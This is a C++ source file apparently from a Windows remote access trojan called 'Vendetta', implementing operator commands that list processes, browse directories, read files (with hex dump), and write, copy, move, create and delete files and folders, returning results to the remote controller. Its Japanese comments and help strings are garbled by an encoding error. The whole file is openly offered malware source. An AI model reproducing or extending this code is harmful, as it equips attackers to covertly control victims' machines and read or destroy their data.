// RAT�̃R�}���h���`
#include "Vendetta.h"





void Write(std::vector<std::string>& tokens) {

    // �w���v
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "�g�p���@: write <���[�h> <�t�@�C����> <�������ޕ�����>" + newline +
            "����: �w�肵���t�@�C���ɕ�������������݂܂��B���[�h���w�肷�邱�ƂŁA" + newline +
            "�t�@�C���ɕ������ǋL���邩�A�����̓��e���㏑�����邩��I���ł��܂��B" + newline + newline +
            "�p�����[�^:" + newline +
            "  <���[�h> �������݃��[�h���w�肵�܂�:" + newline +
            "           append: �����̓��e�ɒǉ�����`�ŏ������݂܂�" + newline +
            "           overwrite: �t�@�C���̊������e���폜���ď������݂܂�" + newline +
            "  <�t�@�C����> �������ޑΏۂ̃t�@�C�����܂��̓p�X" + newline +
            "  <�������ޕ�����> �t�@�C���ɏ������ޕ�����" + newline + newline +
            "�g�p��:" + newline +
            "  write overwrite myfile.txt HelloWorld" + newline;

        SendString(helpStr);
        return;
    }

    
    if (tokens.size() < 4) {
        SendString("�g�p���@: write <���[�h> <�t�@�C����> <�������ޕ�����>");
        return;
    }

    std::string mode = tokens[1];
    std::string filename = tokens[2];
    std::string text;

    // �����Ɏw�肳�ꂽ�e�L�X�g����������
    for (size_t i = 3; i < tokens.size(); ++i) {
        text += tokens[i] + " ";
    }

    std::ofstream file;

    // �ǋL
    if (mode == "append") {
        file.open(filename, std::ios::app);
    }
    // �㏑��
    else if (mode == "overwrite") {
        file.open(filename, std::ios::trunc);
    }
    else {
        SendString("[-] �����ȃ��[�h�ł�");
        return;
    }

    if (file.is_open()) {
        file << text << std::endl;
        SendString("[+] �t�@�C���ɏ������݂܂���: " + filename);
    }
    else {
        SendString("[-] �t�@�C�����J���܂���ł���");
    }
}





void Pwd(std::vector<std::string>& tokens) {

    // �w���v
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "�g�p���@: pwd" + newline +
            "����: ���݂̍�ƃf�B���N�g���̃p�X��\�����܂�";

        SendString(helpStr);
        return;
    }

    char currentDir[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, currentDir)) {
        SendString(std::string(currentDir));
    }
    else {
        SendString("[-] �J�����g�f�B���N�g���̎擾�Ɏ��s");
    }
}


void ProcessList(std::vector<std::string>& tokens) {
    HANDLE hProcessSnap;
    PROCESSENTRY32W pe32;
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    // �v���Z�X�̃X�i�b�v�V���b�g���擾
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        SendString("[-] �X�i�b�v�V���b�g�̍쐬�Ɏ��s���܂���");
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32FirstW(hProcessSnap, &pe32)) {
        SendString("[-] �v���Z�X���̎擾�Ɏ��s���܂���");
        return;
    }

    // �񕝂̒�`
    const int pidWidth = 8;
    const int nameWidth = 40;
    const int archWidth = 15;
    const int threadsWidth = 12;
    const int priorityWidth = 10;
    const int memoryWidth = 15;

    // UTF-8�ŃG���R�[�h���ꂽ�w�b�_�[������
    std::ostringstream processList;
    processList << std::left
        << std::setw(pidWidth) << "PID"
        << std::setw(nameWidth) << "�v���Z�X��"
        << std::setw(archWidth) << "�A�[�L�e�N�`��"
        << std::setw(threadsWidth) << "�X���b�h��"
        << std::setw(priorityWidth) << "�D��x"
        << std::setw(memoryWidth) << "������(MB)"
        << "\n"
        << std::string(100, '-') << "\n"; // ��؂��

    do {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE ,pe32.th32ProcessID);

        std::string architecture = "�s��";
        BOOL isWow64 = FALSE;
        if (hProcess != NULL) {
            if (IsWow64Process(hProcess, &isWow64)) {
                architecture = isWow64 ? "x86" : "x64";
            }
        }

        // ���������̎擾
        PROCESS_MEMORY_COUNTERS_EX pmc;
        std::string memoryUsage = "N/A";
        if (hProcess != NULL && GetProcessMemoryInfo(hProcess, (PROCESS_MEMORY_COUNTERS*)&pmc, sizeof(pmc))) {
            double memMB = pmc.WorkingSetSize / (1024.0 * 1024.0);
            std::ostringstream memStream;
            memStream << std::fixed << std::setprecision(1) << memMB;
            memoryUsage = memStream.str();
        }

        // �v���Z�X�������C�h��������UTF-8�ɕϊ�
        std::string processName;
        int name_size = WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, nullptr, 0, nullptr, nullptr);
        if (name_size > 0) {
            std::vector<char> buffer(name_size);
            WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, buffer.data(), name_size, nullptr, nullptr);
            processName = buffer.data();
        }

        // �v���Z�X���̏o��
        processList << std::left
            << std::setw(pidWidth) << pe32.th32ProcessID
            << std::setw(nameWidth) << processName
            << std::setw(archWidth) << architecture
            << std::setw(threadsWidth) << pe32.cntThreads
            << std::setw(priorityWidth) << pe32.pcPriClassBase
            << std::setw(memoryWidth) << memoryUsage
            << "\n";

        if (hProcess != NULL) {
            CloseHandle(hProcess);
        }

    } while (Process32NextW(hProcessSnap, &pe32));

    SendString(processList.str());
    CloseHandle(hProcessSnap);
}

void Touch(std::vector<std::string>& tokens) {
    if (tokens.size() < 2) {
        SendString("�g�p���@: touch <�t�@�C����>");
        return;
    }

    std::string filename = tokens[1];
    HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        SendString("[+] �t�@�C���쐬: " + filename);
    }
    else {
        SendString("[-] �t�@�C���̍쐬�Ɏ��s");
    }
}



void Copy(std::vector<std::string>& tokens) {
    if (tokens.size() < 3) {
        SendString("�g�p���@: cp <�\�[�X> <����>");
        return;
    }

    std::string source = tokens[1];
    std::string destination = tokens[2];

    std::ifstream src(source, std::ios::binary);
    std::ofstream dst(destination, std::ios::binary);

    if (src && dst) {
        dst << src.rdbuf();
        SendString("[+] " + source + " ���� " + destination + " �փR�s�[���܂���: ");
    }
    else {
        SendString("[-] �t�@�C�����R�s�[�ł��܂���ł���");
    }
}

// mv�R�}���h (�t�@�C����f�B���N�g���̈ړ�)
void Move(std::vector<std::string>& tokens) {
    if (tokens.size() < 3) {
        SendString("�g�p���@: mv <�\�[�X> <����>");
        return;
    }

    std::string source = tokens[1];
    std::string destination = tokens[2];

    if (MoveFileA(source.c_str(), destination.c_str())) {
        SendString("[+] " + source + " ���� " + destination + " �ֈړ����܂���");
    }
    else {
        SendString("[-] �t�@�C�����ړ��ł��܂���ł���");
    }
}


void Remove(std::vector<std::string>& tokens) {
    if (tokens.size() < 2) {
        SendString("�g�p���@: rm <�t�@�C����>");
        return;
    }

    std::string filename = tokens[1];
    if (DeleteFileA(filename.c_str())) {
        SendString("[+] �t�@�C���폜: " + filename);
    }
    else {
        SendString("[-] �t�@�C���̍폜�Ɏ��s");
    }
}

void Dir(std::vector<std::string>& tokens) {
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA("*", &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    std::ostringstream fileList;
    fileList << std::left << std::setw(20) << "���t/����" << std::setw(12) << "�T�C�Y" << "���O" << "\n";

    do {
        // �t�@�C����f�B���N�g���̑������擾
        bool isDir = (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;

        // �X�V�������擾
        FILETIME ft = findFileData.ftLastWriteTime;
        SYSTEMTIME st;
        FileTimeToSystemTime(&ft, &st);

        // �T�C�Y���擾
        std::string sizeStr;
        if (isDir) {
            sizeStr = " ";
        }
        else {
            sizeStr = std::to_string(findFileData.nFileSizeLow);
            if (findFileData.nFileSizeLow >= 1024) {
                sizeStr = std::to_string(findFileData.nFileSizeLow / 1024) + " KB";
            }
            else {
                sizeStr += " b";
            }
        }

        // �����̃t�H�[�}�b�g
        char dateTimeStr[20];
        sprintf_s(dateTimeStr, sizeof(dateTimeStr), "%04d/%02d/%02d %02d:%02d",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);

        // �t�@�C�����X�g�ɒǉ�
        fileList << std::left << std::setw(20) << dateTimeStr
            << std::setw(12) 
            << sizeStr
            << (isDir ? "<DIR>" : "   ") 
            << " " 
            << findFileData.cFileName 
            << "\n";

    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);
    SendString(fileList.str());
}







void Cat(std::vector<std::string>& tokens) {
    bool binaryMode = false;

    // �w���v
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "�g�p���@: cat <�t�@�C����> [-b]" + newline +
            "����: �w�肵���t�@�C���̓��e��\�����܂��B" + newline + newline +
            "�I�v�V����:" + newline +
            "  -b : �o�C�i�����[�h�Ńt�@�C����\�����܂��B���e��16�i���̃o�C�g��ŏo�͂���A" + newline +
            "       �e�o�C�g�̓X�y�[�X�ŋ�؂��܂��B" + newline + newline +
            "�ڍ�:" + newline +
            "  'cat' �R�}���h�́A�e�L�X�g�t�@�C����o�C�i���t�@�C���̓��e��W���o�͂ɕ\�����܂��B" + newline +
            "  �e�L�X�g�t�@�C���̏ꍇ�͊e�s�����s�ŋ�؂��ĕ\�����܂��B�o�C�i�����[�h�ł́A" + newline +
            "  �e�o�C�g��16�i���`���ŕ\������A64�o�C�g���Ƃɉ��s����܂��B" + newline + newline +
            "�g�p��:" + newline +
            "  cat example.txt   - �e�L�X�g���[�h�� 'example.txt' �̓��e��\��" + newline +
            "  cat example.bin -b - �o�C�i�����[�h�� 'example.bin' �̓��e��16�i���\��" + newline;

        SendString(helpStr);
        return;
    }

    // �t�@�C�����̑��݃`�F�b�N
    if (tokens.size() < 2) {
        SendString("�g�p���@: cat <�t�@�C����> [-b]");
        return;
    }

    // �I�v�V�����̏���
    std::string filename = tokens[1];
    if (tokens.size() > 2 && tokens[2] == "-b") {
        binaryMode = true;
    }

    std::ifstream file(filename, binaryMode ? std::ios::binary : std::ios::in);

    // �t�@�C�����J���Ȃ��ꍇ�̃G���[����
    if (!file.is_open()) {
        SendString("�G���[: �t�@�C�� '" + filename + "' ���J���܂���");
        return;
    }

    std::ostringstream fileContents;
    if (binaryMode) {
        // �o�C�i���t�@�C����16�i���ŕ\��
        char byte;
        int byteCount = 0;
        while (file.get(byte)) {
            fileContents << std::hex << std::setw(2) << std::setfill('0') << (static_cast<int>(byte) & 0xff) << " ";
            byteCount++;

            // 16�o�C�g���Ƃɉ��s
            if (byteCount % 64 == 0) {
                fileContents << "\n";
            }
        }
        // �Ō�ɉ��s���Ȃ��ꍇ�͉��s��ǉ�
        if (byteCount % 16 != 0) {
            fileContents << "\n";
        }
    }
    else {
        // �e�L�X�g�t�@�C���̓ǂݍ���
        std::string line;
        while (std::getline(file, line)) {
            fileContents << line << "\n";
        }
    }

    file.close();

    // �t�@�C���̓��e�𑗐M
    SendString(fileContents.str());
}



void Cd(std::vector<std::string>& tokens) {
    if (tokens.size() < 2) {
        SendString("�g�p���@: cd <�f�B���N�g��>");
        return;
    }

    std::string directory = tokens[1];

    // �f�B���N�g����ύX
    if (SetCurrentDirectoryA(directory.c_str())) {
        SendString("Changed directory to: " + directory);
    }
    else {
        SendString("Error: Unable to change directory");
    }
}






void MkDir(std::vector<std::string>& tokens) {
    // �w���v
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "�g�p���@: mkdir <�t�H���_��>" + newline +
            "����: �V�����t�H���_���쐬���܂�";
        SendString(helpStr);
        return;
    }

    if (tokens.size() < 2) {
        SendString("�g�p���@: mkdir <�t�H���_��>");
        return;
    }

    std::string dirName = tokens[1];
    if (CreateDirectoryA(dirName.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        SendString("Created directory: " + dirName);
    }
    else {
        SendString("Error: Unable to create directory");
    }
}

void Rmdir(std::vector<std::string>& tokens) {

    // �w���v
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "�g�p���@: rmdir" + newline +
            "����: �t�H���_���폜���܂�";

        SendString(helpStr);
        return;
    }
    if (tokens.size() < 2) {
        SendString("�g�p���@: rmdir <�폜����t�H���_��>");
        return;
    }

    std::string dirName = tokens[1];
    if (RemoveDirectoryA(dirName.c_str())) {
        SendString("Removed directory: " + dirName);
    }
    else {
        SendString("Error: Unable to remove directory");
    }
}